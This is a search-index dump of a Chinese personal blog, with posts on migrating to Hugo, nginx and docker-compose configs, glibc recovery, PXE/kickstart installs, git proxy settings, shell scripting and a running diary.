[{"content":"前言 记录一个跑渣的跑步日常，每次都单独记录未免有些繁琐，除了比较有纪念意义的，就以周和月为单位来记录吧，一点一滴见证自己成长~\n周日为一周开始，计数以本年的第几周为准\n2022年 第 29 周 总跑量 60 公里，周跑量 20 公里，6 分左右配速，步频可以稳定在 170-180，心率可以控制在 175 左右了\n第 28 周 第 27 周 第 26 周 第 25 周 2022年7月6日，第一次五公里 目前总跑量37公里，第一次不休息完成了5公里\n存在问题：步频较慢，心率太高\n后续计划：尝试提高步频，继续坚持5公里\n","permalink":"https://www.lvbibir.cn/posts/life/running/","summary":"前言 记录一个跑渣的跑步日常，每次都单独记录未免有些繁琐，除了比较有纪念意义的，就以周和月为单位来记录吧，一点一滴见证自己成长~ 周日为一周开始","title":"跑渣的跑步日常"},{"content":"前言 记录wordpress迁移至hugo的过程，大多参考sulv大佬的博客，本文更偏向于个人备忘，并不是一篇很合格的教程\n博客流水线 编辑文章 采用 typora + picgo + 七牛云图床流程，参考文章\n生成静态文件 hugo -F --cleanDestinationDir 后面两个参数表示会先删除之前生成的 public 目录，保证每次生成的 public 都是新的\n上传静态文件 rsync -avuz --progress --delete Desktop/lvbibir/2-lvbibir.github.io/public/ root@101.201.150.47:/root/wordpress-blog/hugo-public/ mobaxterm 是我一直以来的主力终端，它的本地终端自带了很多linux命令，用rsync命令上传静态文件至阿里服务器，且会先删除服务器上之前的静态文件，保证博客的内容保持最新\n归档备份 研究 hugo 建站之初是打算采用 github pages 来发布静态博客\n优点 仅需一个github账号和简单配置即可将静态博客发布到 github pages 没有维护的时间成本，可以将精力更多的放到博客内容本身上去 无需备案 无需ssl证书 缺点 访问速度较慢 访问速度较慢 访问速度较慢 虽说访问速度较慢可以通过各家的cdn加速来解决，但由于刚开始建立 blog 选择的是 wordpress ，域名、服务器、备案、证书等都已经一应俱全，且之前的架构采用 docker，添加一台 nginx 来跑 hugo 的静态网站是很方便的\n所以干脆沿用之前的 github仓库 ，来作为我博客的归档管理，也可以方便家里电脑和工作电脑之间的数据同步\n将hugo博客部署到阿里云 之前的wordpress博客部署在阿里云的一套 docker-compose 环境下，这篇文章有详细记录\n要做的仅仅是在之前的docker-compose.yml 中添加一个新的nginx环境用于跑hugo生成的静态文件，代理nginx中配置一下新nginx服务器，ssl证书依旧沿用之前的即可\n以下是一些配置文件示例\nwordpress-blog/docker-compose.yml 新增了hugo-nginx容器\nversion: \u0026#39;3.1\u0026#39; services: proxy: # 前端代理nginx image: superng6/nginx:debian-stable-1.18.0 container_name: nginx-proxy restart: always networks: wordpress_net: ipv4_address: 172.19.0.6 ports: - 80:80 - 443:443 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/conf/proxy/nginx.conf:/etc/nginx/nginx.conf - $PWD/conf/proxy/default.conf:/etc/nginx/conf.d/default.conf - $PWD/ssl:/etc/nginx/ssl - $PWD/logs/proxy:/var/log/nginx depends_on: - web web: # wordpress的nginx image: superng6/nginx:debian-stable-1.18.0 container_name: wordpress-nginx restart: always networks: wordpress_net: ipv4_address: 172.19.0.5 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/conf/nginx/nginx.conf:/etc/nginx/nginx.conf - $PWD/conf/nginx/default.conf:/etc/nginx/conf.d/default.conf - $PWD/conf/fastcgi.conf:/etc/nginx/fastcgi.conf - /dev/shm/nginx-cache:/var/run/nginx-cache # - $PWD/nginx-cache:/var/run/nginx-cache - $PWD/wordpress:/var/www/html - $PWD/logs/nginx:/var/log/nginx depends_on: - wordpress hugo: # hugo的nginx image: superng6/nginx:debian-stable-1.18.0 container_name: hugo-nginx restart: always networks: wordpress_net: ipv4_address: 172.19.0.7 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/conf/hugo/nginx.conf:/etc/nginx/nginx.conf - /dev/shm/nginx-cache:/var/run/nginx-cache - $PWD/hugo-public:/var/www/html - $PWD/logs/hugo:/var/log/nginx wordpress: image: wordpress:5-fpm container_name: wordpress-php restart: always networks: wordpress_net: ipv4_address: 172.19.0.4 environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: #密码填自己的 WORDPRESS_DB_NAME: wordpress volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/wordpress:/var/www/html - /dev/shm/nginx-cache:/var/run/nginx-cache # - $PWD/nginx-cache:/var/run/nginx-cache - $PWD/conf/uploads.ini:/usr/local/etc/php/php.ini depends_on: - redis - db redis: image: redis:5 container_name: wordpress-redis restart: always networks: wordpress_net: ipv4_address: 172.19.0.3 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/redis-data:/data depends_on: - db db: image: mysql:5.7 container_name: wordpress-mysql restart: always networks: wordpress_net: ipv4_address: 172.19.0.2 environment: MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress MYSQL_RANDOM_ROOT_PASSWORD: \u0026#39;1\u0026#39; volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/mysql-data:/var/lib/mysql - $PWD/conf/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf networks: wordpress_net: driver: bridge ipam: config: - subnet: 172.19.0.0/16 wordpress-blog/conf/proxy/default.conf 前端代理nginx的配置文件，原先只有 lvbibir.cn ，新增了 www.lvbibir.cn 相关配置\nserver { listen 80; listen [::]:80; server_name lvbibir.cn; return 301 https://$host$request_uri; } server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name lvbibir.cn; location / { proxy_pass http://172.19.0.5:80; proxy_redirect off; # 保证获取到真实IP proxy_set_header X-Real-IP $remote_addr; # 真实端口号 proxy_set_header X-Real-Port $remote_port; # X-Forwarded-For 是一个 HTTP 扩展头部。 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 在多级代理的情况下，记录每次代理之前的客户端真实ip proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; # 获取到真实协议 proxy_set_header X-Forwarded-Proto $scheme; # 真实主机名 proxy_set_header Host $host; # 设置变量 proxy_set_header X-NginX-Proxy true; # 开启 brotli proxy_set_header Accept-Encoding \u0026#34;br\u0026#34;; } # 日志 access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # 证书 ssl_certificate /etc/nginx/ssl/lvbibir.cn.pem; ssl_certificate_key /etc/nginx/ssl/lvbibir.cn.key; # curl https://ssl-config.mozilla.org/ffdhe2048.txt \u0026gt; /path/to/dhparam # ssl_dhparam /etc/nginx/ssl/dhparam; # HSTS (ngx_http_headers_module is required) (63072000 seconds) add_header Strict-Transport-Security \u0026#34;max-age=63072000\u0026#34; always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; # verify chain of trust of OCSP response using Root CA and Intermediate certs # ssl_trusted_certificate /etc/nginx/ssl/all.sleele.com/fullchain.cer; # replace with the IP address of your resolver resolver 223.5.5.5; resolver_timeout 5s; } server { listen 80; listen [::]:80; server_name www.lvbibir.cn; return 301 https://$host$request_uri; } server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name www.lvbibir.cn; location / { proxy_pass http://172.19.0.7:80; proxy_redirect off; # 保证获取到真实IP proxy_set_header X-Real-IP $remote_addr; # 真实端口号 proxy_set_header X-Real-Port $remote_port; # X-Forwarded-For 是一个 HTTP 扩展头部。 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 在多级代理的情况下，记录每次代理之前的客户端真实ip proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; # 获取到真实协议 proxy_set_header X-Forwarded-Proto $scheme; # 真实主机名 proxy_set_header Host $host; # 设置变量 proxy_set_header X-NginX-Proxy true; # 开启 brotli proxy_set_header Accept-Encoding \u0026#34;br\u0026#34;; } # 日志 access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # 证书 ssl_certificate /etc/nginx/ssl/lvbibir.cn.pem; ssl_certificate_key /etc/nginx/ssl/lvbibir.cn.key; # curl https://ssl-config.mozilla.org/ffdhe2048.txt \u0026gt; /path/to/dhparam # ssl_dhparam /etc/nginx/ssl/dhparam; # HSTS (ngx_http_headers_module is required) (63072000 seconds) add_header Strict-Transport-Security \u0026#34;max-age=63072000\u0026#34; always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; # verify chain of trust of OCSP response using Root CA and Intermediate certs # ssl_trusted_certificate /etc/nginx/ssl/all.sleele.com/fullchain.cer; # replace with the IP address of your resolver resolver 223.5.5.5; resolver_timeout 5s; } wordpress-blog/conf/hugo/nginx.conf user root; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; include /usr/share/nginx/modules/*.conf; events { worker_connections 1024; } http { log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; # 配置http server { listen 80 default_server; listen [::]:80 default_server; server_name www.lvbibir.cn; root /var/www/html; include /etc/nginx/default.d/*.conf; location / { root /var/www/html; index index.html index.htm; } error_page 404 /404.html; location = /40x.html { root /var/www/html; } error_page 500 502 503 504 /50x.html; location = /50x.html { } } } seo优化 https://www.sulvblog.cn/posts/blog/hugo_seo/\n添加twikoo评论组件 基本完全按照sulv博主的文章来操作，某些地方官方有更新，不过也只是更改了页面罢了\nhttps://www.sulvblog.cn/posts/blog/hugo_twikoo/\n顺便记录一下账号关系：mongodb使用google账号登录，vercel使用github登录\n修改博客url https://gohugo.io/content-management/urls/\ntodo 修改所有文章的文件名为全英文 百度seo优化 谷歌seo优化 必应seo优化 尝试再次优化nginx的配置，之前的配置对于wordpress可能更适用 图床备份 将所有文章进行内容整理，剔除一些没什么营养的文章 ","permalink":"https://www.lvbibir.cn/posts/blog/hello_hugo/","summary":"前言 记录wordpress迁移至hugo的过程，大多参考sulv大佬的博客，本文更偏向于个人备忘，并不是一篇很合格的教程 博客流水线 编辑文章 采","title":"【置顶】Hello,hugo!"},{"content":"前言 记录一下在 OpenEuler 20.03 LTS aarch64 系统上误操作升级了 glibc 后紧急修复的步骤\n起因 在使用 cephadm 安装 ceph v16.2 时升级了 python，系统默认版本是 3.7.4 ，升级后版本是 3.8.5，glibc 作为依赖同时进行了升级，系统默认版本是 2.28 ，升级后版本是 2.31，幸好记录及时，截图留存了软件包升级信息，如下\n在没有十分把握的情况下不要用 yum install -y，使用 yum install 先判断好依赖安装带来的影响\n升级过程未出任何问题，便没在意，可是后续 openssh 由于 glibc 的升级导致连接失败，一番 baidu 加 google 未解决 openssh 连接问题，于是便着手开始降级 glibc 至系统默认版本，从系统镜像中找到 glibc 相关的三个软件包\n由于是版本降级，脑子一热便采用 rpm -Uvh --nodeps glibc* 方式强制安装，至此，系统崩溃\n系统几乎所有命令都无法使用，报错如下\n出现这个问题的原因大致是因为强制安装并未完全成功，lib64 一些相关的库文件软链接丢失\n[root@localhost ~]# ls -l /lib64/libc.so.6 lrwxrwxrwx 1 root root 12 7月 14 14:43 /lib64/libc.so.6 -\u0026gt; libc-2.28.so # 恢复前这里是 libc-2.31.so 在强制安装 glibc-2.28 时， libc-2.31.so 已经被替换成了 libc-2.28.so ，由于安装失败 libc.so.6 链接到的还是 libc-2.31.so，自然会报错 no such file\n恢复 系统绝大部分命令都是依赖 libc.so.6 的，我们可以通过 export LD_PRELOAD=\u0026quot;库文件路径\u0026quot; 设置优先使用的库\nexport LD_PRELOAD=/lib64/libc-2.28.so 此时 ls 、cd、mv 等基础命令以及最重要的 ln 链接命令已经可以使用了，接下来就是恢复软链接\nrm -f /lib64/libc.so.6 ln -s /lib64/libc-2.28.so /lib64/libc.so.6 但是 yum 命令依赖的几个库软链接还没有恢复，按照报错提示跟上述步骤一样，先删除掉依赖的库文件，再重新软链接过去\n之后就是重新 yum localinstall 安装一下未安装成功的 glic ，之前强制安装时已经将高版本的 glibc 清理掉了，这里重新安装很顺利\n也许之前使用 yum localinstall 安装可能就不会出现这个问题了，rpm \u0026ndash;nodeps 也要少用~\nyum localinstall glibc* 软件包安装过程中没有报错，经测试系统一切正常，openssh 也可以正常连接了\n以上，系统恢复正常\n","permalink":"https://www.lvbibir.cn/posts/tech/glibc_wu_sheng_ji/","summary":"前言 记录一下在 OpenEuler 20.03 LTS aarch64 系统上误操作升级了 glibc 后紧急修复的步骤 起因 在使用 cephadm 安装 ceph v16.2 时升级了 python，系统默认版本是 3.7.4 ，升级后版本是 3.8.5","title":"glibc 误升级后修复"},{"content":"前言 测试环境：vmware workstation V16.1.2\n服务端配置 系统安装 系统安装过程略，系统版本：iSoft-ServerOS-V6.0-rc1\n网卡选择nat模式，注意关闭一下 workstation 自带的 dhcp，ip：1.1.1.21\n关闭防火墙及selinux iptables -F systemctl stop firewalld systemctl disable firewalld setenforce 0 sed -i \u0026#39;/SELINUX/s/enforcing/disabled/\u0026#39; /etc/sysconfig/selinux 安装相关的软件包 这里由于HW行动的原因，外网yum源暂不可用，使用本地yum源安装相关软件包\n[root@localhost ~]# mount -o loop /dev/sr0 /mnt [root@localhost ~]# mkdir /etc/yum.repos.d/bak [root@localhost ~]# mv /etc/yum.repos.d/isoft* /etc/yum.repos.d/bak/ [root@localhost ~]# cat \u0026gt; /etc/yum.repos.d/local.repo \u0026lt;\u0026lt;EOF \u0026gt; [local] \u0026gt; name=local \u0026gt; baseurl=file:///mnt \u0026gt; gpgcheck=0 \u0026gt; enabled=1 \u0026gt; EOF [root@localhost ~]# dnf clean all [root@localhost ~]# dnf makecache cenots8安装syslinux时需要加 \u0026ndash;nonlinux后缀，centos7则不需要\ndnf install -y dhcp-server tftp-server httpd syslinux-nonlinux http服务配置 systemctl start httpd systemctl enable httpd 能访问到httpd即可\ntftp服务配置 systemctl start tftp systemctl enable tftp cp /usr/share/syslinux/menu.c32 /var/lib/tftpboot/ cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/ mkdir /var/lib/tftpboot/pxelinux.cfg dhcp服务配置 vim /etc/dhcp/dhcpd.conf\noption domain-name \u0026#34;example.org\u0026#34;; option domain-name-servers 8.8.8.8, 114.114.114.114; default-lease-time 84600; max-lease-time 100000; log-facility local7; subnet 1.1.1.0 netmask 255.255.255.0 { range 1.1.1.100 1.1.1.200; option routers 1.1.1.253; next-server 1.1.1.21; # 本机ip（tftpserver的ip） filename \u0026#34;pxelinux.0\u0026#34;; } systemctl start dhcpd systemctl enable dhcpd isoft_6.0_x86 http服务配置 创建目录\n# 创建目录 mkdir -p /var/www/html/isoft_6.0/isos/x86_64/ # 上传镜像文件 cp -rf /mnt/* /var/www/html/isoft_6.0/isos/x86_64/ # 上传ks.cfg应答文件 vim /var/www/html/isoft_6.0/isos/x86_64/ks.cfg chmod 644 /var/www/html/isoft_6.0/isos/x86_64/ks.cfg ks.cfg文件内容\n# Use graphical install graphical install url --url=http://1.1.1.21/isoft_6.0/isos/x86_64/ %packages @^graphical-server-environment %end # Keyboard layouts keyboard --xlayouts=\u0026#39;cn\u0026#39; # System language lang zh_CN.UTF-8 # Network information network --bootproto=static --device=ens33 --bootproto=dhcp --ipv6=auto --activate network --hostname=localhost.localdomain # Run the Setup Agent on first boot firstboot --enable ignoredisk --only-use=sda autopart --type=lvm # Partition clearing information clearpart --all --initlabel # System timezone timezone Asia/Shanghai --isUtc # Root password rootpw --iscrypted $6$w6X5WYQDyMeAizfs$TFKls9Kuj4Jv6PNKcMZ2BmB1Z/dvRCRkGD9uzm0n8te2UwDgdPCPGkUxCPvExKGenCMINTMcjSH55bCWYDiHx. %addon com_redhat_kdump --disable --reserve-mb=\u0026#39;128\u0026#39; %end %anaconda pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty %end reboot tftp服务配置 # 拷贝内核启动文件 cp /var/www/html/isoft_6.0/isos/x86_64/isolinux/vmlinuz /var/lib/tftpboot/ cp /var/www/html/isoft_6.0/isos/x86_64/isolinux/initrd.img /var/lib/tftpboot/ cp /var/www/html/isoft_6.0/isos/x86_64/isolinux/vesamenu.c32 /var/lib/tftpboot/ # 拷贝菜单配置文件 cp /var/www/html/isoft_6.0/isos/x86_64/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default # 下面这三个文件centos7可以不要，centos8对于这三个文件有一定依赖性 cp /var/www/html/isoft_6.0/isos/x86_64/isolinux/ldlinux.c32 /var/lib/tftpboot/ cp /var/www/html/isoft_6.0/isos/x86_64/isolinux/libutil.c32 /var/lib/tftpboot/ cp /var/www/html/isoft_6.0/isos/x86_64/isolinux/libcom32.c32 /var/lib/tftpboot/ vim /var/lib/tftpboot/pxelinux.cfg/default\ndefault vesamenu.c32 timeout 30 menu title iSoft-Taiji Server OS 6.0 label linux menu label ^Install iSoft-Taiji Server OS 6.0 menu default kernel vmlinuz append initrd=initrd.img ks=http://1.1.1.21/isoft_6.0/isos/x86_64/ks.cfg 测试 注意测试虚拟机内存需要4G左右，否则会报错 no space left\nicoud_1.0_x86 http服务配置 创建目录\n# 创建目录 mkdir -p /var/www/html/icloud_1.0/isos/x86_64/ # 上传镜像文件 mkdir /icloud_os mount -o loop /root/i-CloudOS-1.0-x86_64-202108131137.iso /icloud_os/ cp -rf /icloud_os/* /var/www/html/icloud_1.0/isos/x86_64/ # 上传ks.cfg应答文件 vim /var/www/html/icloud_1.0/isos/x86_64/ks.cfg chmod 644 /var/www/html/icloud_1.0/isos/x86_64/ks.cfg ks.cfg文件内容\n#version=RHEL8 ignoredisk --only-use=sda autopart --type=lvm # Partition clearing information clearpart --all --initlabel --drives=sda # Use graphical install graphical # Use CDROM installation media install url --url=http://1.1.1.21/icloud_1.0/isos/x86_64/ # Keyboard layouts keyboard --vckeymap=us --xlayouts=\u0026#39;\u0026#39; # System language lang zh_CN.UTF-8 # Root password rootpw --iscrypted 123.com # Run the Setup Agent on first boot firstboot --enable # Do not configure the X Window System skipx # System services services --enabled=\u0026#34;chronyd\u0026#34; # System timezone timezone Asia/Shanghai --isUtc %packages @^vmserver-compute-node %end %anaconda pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty %end tftp服务配置 # 拷贝内核启动文件 cp /var/www/html/icloud_1.0/isos/x86_64/isolinux/vmlinuz /var/lib/tftpboot/ cp /var/www/html/icloud_1.0/isos/x86_64/isolinux/initrd.img /var/lib/tftpboot/ cp /var/www/html/icloud_1.0/isos/x86_64/isolinux/vesamenu.c32 /var/lib/tftpboot/ # 拷贝菜单配置文件 cp /var/www/html/icloud_1.0/isos/x86_64/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default # 下面这三个文件centos7可以不要，centos8对于这三个文件有一定依赖性 cp /var/www/html/icloud_1.0/isos/x86_64/isolinux/ldlinux.c32 /var/lib/tftpboot/ cp /var/www/html/icloud_1.0/isos/x86_64/isolinux/libutil.c32 /var/lib/tftpboot/ cp /var/www/html/icloud_1.0/isos/x86_64/isolinux/libcom32.c32 /var/lib/tftpboot/ vim /var/lib/tftpboot/pxelinux.cfg/default\ndefault vesamenu.c32 timeout 30 menu title i-CloudOS 1.0 label linux menu label ^Install i-CloudOS 1.0 menu default kernel vmlinuz append initrd=initrd.img ks=http://1.1.1.21/icloud_1.0/isos/x86_64/ks.cfg 测试 参考 https://blog.csdn.net/weixin_45651006/article/details/103067283\n","permalink":"https://www.lvbibir.cn/posts/tech/pxe_install_isoft6.0_centos8/","summary":"前言 测试环境：vmware workstation V16.1.2 服务端配置 系统安装 系统安装过程略，系统版本：iSoft-ServerOS-V6.0-rc1 网卡选择nat模式，","title":"pxe安装isoft6.0及icloud1.0（Centos8）"},{"content":"前言 书名《人间失格》，北京燕山出版社，译者高艳\n语句摘录 人是不可能一边笑还一边紧紧攥着拳头的，只有猴子才会这样\n女人如果突然哭起来，只要让她们吃些好吃的东西，她们就会立刻好转\n越是对人感到恐惧的人，反倒越希望亲眼看到狰狞恐怖的怪物；越是胆小怯懦、神经兮兮的人，越是期盼暴风雨来的更猛烈一些\n世上所有人的说话方式，都喜欢这样绕圈子，不明说，也不说破，带着想逃避责任的心理，复杂又微妙\n我对死倒是不在乎，但如果因受伤变成残疾人，我是接受不了的\n“你喝太多酒了。”\n“不喝了！从明天起，我滴酒不沾了！”\n“真的？”\n“真的，我一定戒。假如我戒了，良子肯嫁给我吗？” 说要娶她的事，其实是一句玩笑话。\n“当然了。”\n“好，那我们就一言为定。我肯定戒酒”\n可第二天，我又照样从中午起便捏起酒盅来。傍晚时分，我摇摇晃晃走出酒馆，站在由子家的铺子前。\n“良子，对不起，我又喝酒了。”\n“哎呀，真讨厌，故意装成一副喝醉的样子。”\n我被她的话吓了一跳，酒一下子醒了许多。\n“不，是真的。我真喝酒了，不是故意装成喝醉的样子。”\n“别捉弄我，你真坏。” 她对我丝毫没有疑心。\n“你一看不就明白了？我今天又从中午开始喝酒了。原谅我！”\n“你演戏演得真像。”\n“不是演戏，你这个傻丫头！当心我亲你哦。”\n“亲呀！”\n“不，我没有资格亲你。要你嫁给我的事，就此作罢吧。你看我的脸，通红通红的是吧？我确实喝了。”\n“那是因为夕阳照在脸上的缘故，你骗我也没用的。因为我们昨天说定了，你不可能去喝酒的，你承诺过我，你却说自己喝酒了，肯定是在骗人、骗人、骗人！”\n","permalink":"https://www.lvbibir.cn/posts/read/ren_jian_shi_ge/","summary":"前言 书名《人间失格》，北京燕山出版社，译者高艳 语句摘录 人是不可能一边笑还一边紧紧攥着拳头的，只有猴子才会这样 女人如果突然哭起来，只要让她们吃","title":"《人间失格》"},{"content":"前言 仅是对前端一窍不通的我的一次尝试，如果有更好的实现方法可以评论或者发邮件告诉我~\nmd文件中图片并排显示 先贴结论，并排显示图片只需要一段简单的 html 代码\n图片路径可以是网络路径，也可以是本地文件路径\n图片个数和width(宽度)按照自己需求来\n\u0026lt;center class=\u0026#34;half\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;/center\u0026gt; 大多数情况我们使用 markdown 进行图片插入时会直接调用 markdown 语法，如下\n![图片描述](图片路径) 当需要插入多张图片时，比如手机截图，通常这种图片挨个显示未免太丑，如下\n图片实在太长，甚至一张图片都没截完，可以看到并排显示的空间利用率和美观性要比下面单张的好太多\nhugo-papermod主题中修改图片并排显示 先贴结论，按照上文中先在 post 文章中修改好图片代码，再修改站点主目录下面的 assets\\css\\core\\reset.css 文件\n修改好之后，hugo server 预览文章就可以看到图片可以并排显示了\n经测试，单张图片默认最大是792px，四张图片下，每张图片width属性最大设置为194px\nimg { /* 注释掉下面这行 display: block; */ max-width: 100%; } 下面是我误打误撞发现修改方法的过程~\n首先在typora中实现图片并排显示，百度了一下很快就找到了解决方法，但在 hugo server 预览文章时，发现图片依旧是多张图片依次显示\n这里不难想通，typora 和 hugo 对 markdown 中图片的渲染可能有所区别\n接下来使用 chrome 的开发者工具，尝试找到蛛丝马迹（之前最多用开发者工具看一下是否有报错，什么资源请求失败什么的~）\n这里先是通过选取界面元素进行检查，看到了第三列的样式，而且这些样式或者说属性是可以点选的！\n于是我就随便点了点，当把 img-display 这个样式前面的对钩去掉后，惊讶的发现，图片可以并排显示了！\\(^o^)/\n到这里问题基本就解决了，先是尝试找请求的这个css文件，发现在 hugo 编译时生成的 public 下，没什么意义，通过 vscode 的全局查找，找到了 assets\\css\\core\\reset.css 文件，注释掉 display: block 后，图片就可以正常并排显示了。\n引发了友链页面某个问题 修改了上述css文件后发现友链界面的图片变成了下面这样\n多出来两个奇怪的东西，按照之前的方法再次尝试\n去掉该属性后\n最终修改的文件是assets\\css\\extended\\friend-link.css 注释掉 overflow: auto; 之后恢复正常\n目前尚不清楚还会不会有其他影响\n","permalink":"https://www.lvbibir.cn/posts/blog/hugo_image_layout/","summary":"前言 仅是对前端一窍不通的我的一次尝试，如果有更好的实现方法可以评论或者发邮件告诉我~ md文件中图片并排显示 先贴结论，并排显示图片只需要一段简","title":"修改hugo的图片布局，使多张图片可以并排显示"},{"content":"前言 cve 官网或者工信部会发布一些 cve 漏洞，可以看到该漏洞在某次 commit 提交代码后修复的，可以通过检索 kernel.org 中所有内核版本的 ChangeLog 文件中是否包含该 commit 来判断漏洞影响的内核版本（仅针对 linux 的 kernel 相关的漏洞）\n脚本 #!/bin/bash # author: lvbibir # date: 2022-06-23 # 检索 kernel.org 下的所有 ChangeLog 文件，是否包含某项特定的 commit 号 commit=\u0026#39;520778042ccca019f3ffa136dd0ca565c486cedd\u0026#39; version=4 number=0 curl -ks https://cdn.kernel.org/pub/linux/kernel/v$version\\.x/ \u0026gt; list_$version cat list_$version | grep Change | grep -v sign | awk -F\\\u0026#34; \u0026#39;{print $2}\u0026#39; \u0026gt; list_$version\\_cut total=`wc -l list_$version\\_cut | awk \u0026#39;{print $1}\u0026#39;` while read line; do let \u0026#39;number+=1\u0026#39; url=\u0026#34;https://cdn.kernel.org/pub/linux/kernel/v$version.x/$line\u0026#34; echo -e \u0026#34;\\033[31m---------------------正在检索$url----------------第$number 个文件，共$total 个文件\\033[0m\u0026#34; curl -ks $url | grep $commit if [ $? -eq 0 ]; then echo $url \u0026gt;\u0026gt; ./result_$version fi done \u0026lt; ./list_$version\\_cut echo -e \u0026#34;\\033[32m脚本执行完成，结果已保存至当前目录的 result_$version \\033[0m\u0026#34; ","permalink":"https://www.lvbibir.cn/posts/tech/shell_search_url_files/","summary":"前言 cve 官网或者工信部会发布一些 cve 漏洞，可以看到该漏洞在某次 commit 提交代码后修复的，可以通过检索 kernel.org 中所有内核版本的 ChangeLog 文件中是否包含该 commit 来判断漏洞影","title":"shell脚本之检索某url中所有文件的内容"},{"content":"# 设置全局代理 git config --global https.proxy http://127.0.0.1:1080 git config --global https.proxy https://127.0.0.1:1080 # 使用socks5代理的 例如ss，ssr 1080是windows下ss的默认代理端口,mac下不同，或者有自定义的，根据自己的改 git config --global http.proxy socks5://127.0.0.1:1080 git config --global https.proxy socks5://127.0.0.1:1080 # 只对github.com使用代理，其他仓库不走代理 git config --global http.https://github.com.proxy socks5://127.0.0.1:20081 git config --global https.https://github.com.proxy socks5://127.0.0.1:20081 # 取消github代理 git config --global --unset http.https://github.com.proxy git config --global --unset https.https://github.com.proxy # 取消全局代理 git config --global --unset http.proxy git config --global --unset https.proxy ","permalink":"https://www.lvbibir.cn/posts/tech/git_set_proxy/","summary":"# 设置全局代理 git config --global https.proxy http://127.0.0.1:1080 git config --global https.proxy https://127.0.0.1:1080 # 使用socks5代理的 例如ss，ssr 1080是windows下ss的默认代理端口,mac下不同，或者有","title":"git设置代理"},{"content":"添加节点 管理防火墙及selinux\n安装docker-ce\n提前下载docker镜像\n修改网卡名称\n修改主机名\n配置ssh免密\nkolla-ansible -i ./multinode bootstrap-servers --limit node135 kolla-ansible -i ./multinode prechecks --limit node135 kolla-ansible -i ./multinode deploy --limit node135 参考 https://blog.csdn.net/qq_33316576/article/details/107457111\nhttps://blog.csdn.net/networken/article/details/106745167\n","permalink":"https://www.lvbibir.cn/posts/tech/kolla-ansible_deploy_multinode_train/","summary":"添加节点 管理防火墙及selinux 安装docker-ce 提前下载docker镜像 修改网卡名称 修改主机名 配置ssh免密 kolla-ansible -i ./multinode bootstrap-servers --limit node135 kolla-ansible -i ./multinode prechecks --limit node135","title":"kolla-ansible部署多节点openstack（Train版）"},{"content":"shell 脚本通常有 sh filename、bash filename、./filename、source filename 这四种执行方式\nsource filename 可以使用 . filename 代替，在当前的 bash 环境下读取并执行脚本文件中的命令，且脚本文件文件的变量，在脚本执行完成后会保存下来 ./filename 和 sh filename 或者 bash filename 是等效的，都是开启一个子shell来运行脚本文件，脚本中设置的变量执行完毕后不会保存 除./filename 外，source filename 、. filename 、sh filename 、bash filename 都是不需要执行权限的\n变量和权限问题示例\n# 设置临时变量，仅在当前 bash 环境生效 [root@lvbibir ~]# name=lvbibir [root@lvbibir ~]# echo $name lvbibir [root@lvbibir ~]# [root@lvbibir ~]# cat test.sh #!/bin/bash echo $name # source 或者 . 可以获取到父 bash 环境的变量 [root@lvbibir ~]# source test.sh lvbibir [root@lvbibir ~]# . test.sh lvbibir # sh、bash、./三种方式都使用了子 bash 环境，所以无法获取父 bash 环境的变量 # ./ 方式需要脚本有执行权限 [root@lvbibir ~]# sh test.sh [root@lvbibir ~]# bash test.sh [root@lvbibir ~]# ./test.sh -bash: ./test.sh: Permission denied [root@lvbibir ~]# chmod a+x test.sh [root@lvbibir ~]# ./test.sh 同理，使用 source 或者 . 也可以在 bash 环境中获取到脚本中设置的变量\n[root@lvbibir ~]# cat \u0026gt; test.sh \u0026lt;\u0026lt; EOF \u0026gt; #!/bin/bash \u0026gt; number=22 \u0026gt; \u0026gt; EOF [root@lvbibir ~]# echo $number # sh bash ./ 三种方式无法获取脚本中的变量 